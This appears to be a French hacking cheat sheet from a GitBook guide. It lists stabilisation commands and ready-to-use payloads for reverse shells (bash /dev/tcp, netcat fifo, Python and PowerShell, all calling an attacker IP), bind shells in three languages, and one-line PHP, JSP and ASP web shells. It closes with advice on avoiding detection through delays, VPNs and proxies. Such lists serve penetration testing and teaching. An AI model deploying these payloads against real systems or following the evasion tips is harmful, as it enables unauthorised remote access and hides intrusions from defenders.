# Shell Stable et Reverse Shell

## **Shell Stable**

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

### **1. Utilisation de `rlwrap`**

Si l'outil `rlwrap` est disponible sur la machine attaquante, tu peux améliorer l’interactivité du shell avec l'historique et les touches directionnelles :

```bash
rlwrap /bin/bash
```

### **2. Méthode Bash (sans Python)**

Si Python n'est pas disponible, mais que Bash est présent, utilise cette commande pour obtenir un shell interactif :

```bash
/bin/bash -i
```

### **3. Méthode Python**

Si Python est disponible sur la machine cible, utilise cette commande pour obtenir un shell interactif :

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### **4. Méthode Python3**

Si Python3 est disponible, utilise cette commande :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### **5. Méthode avec `socat` (si disponible)**

Si `socat` est disponible sur la machine cible ou si tu peux l’installer, tu peux établir un shell stable :

```bash
socat file:`tty`,raw,echo=0 tcp-connect:<IP>:<PORT>
```

### **6. Méthode Netcat et `/dev/tcp`**

Si l’accès réseau est possible depuis le shell et que la machine cible permet la lecture via `/dev/tcp`, tu peux établir une connexion stable avec Netcat :

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f
```

### **7. Utilisation de SSH**

Si tu as accès à une session avec un shell limité, tu peux essayer d’utiliser SSH pour obtenir un shell stable :

```bash
ssh user@localhost /bin/bash
```

***

## **Reverse Shell**

Un reverse shell est utilisé pour établir une connexion de la machine cible vers ton PC (machine attaquante). Voici des exemples pour différents langages.

### **1. Bash**

Commande 1 :

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Commande 2 :

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 > /tmp/f
```

### **2. Python**

Si Python est disponible sur la cible :

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### **3. Python3**

Si Python3 est disponible :

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### **4. PowerShell**

Utilise cette commande si PowerShell est présent :

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

***

## **Bind Shell**

Un bind shell permet à ton PC de se connecter à un port ouvert sur la machine cible.

### **1. Bash**

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 > /tmp/f
```

### **2. Python**

```python
python3 -c 'import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())'
```

### **3. PowerShell**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

***

## **Web Shell**

Un web shell est une interface web permettant d’exécuter des commandes sur un serveur via un navigateur.

### **1. PHP**

```php
<?php system($_REQUEST["cmd"]); ?>
```

### **2. JSP**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### **3. ASP**

```asp
<% eval request("cmd") %>
```

***

## **Bonnes Pratiques**

1. **Obtenir des autorisations** :
   * Toujours travailler dans un cadre légal et éthique. Obtenez des autorisations explicites avant de tester des systèmes.
2. **Minimiser les traces** :
   * Configurez des délais entre les connexions et utilisez des outils comme des VPN ou des proxys pour éviter d’attirer l’attention.
3. **Analyser les environnements** :
   * Avant d’exécuter un shell interactif, vérifiez les configurations locales pour éviter de briser les sessions existantes.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
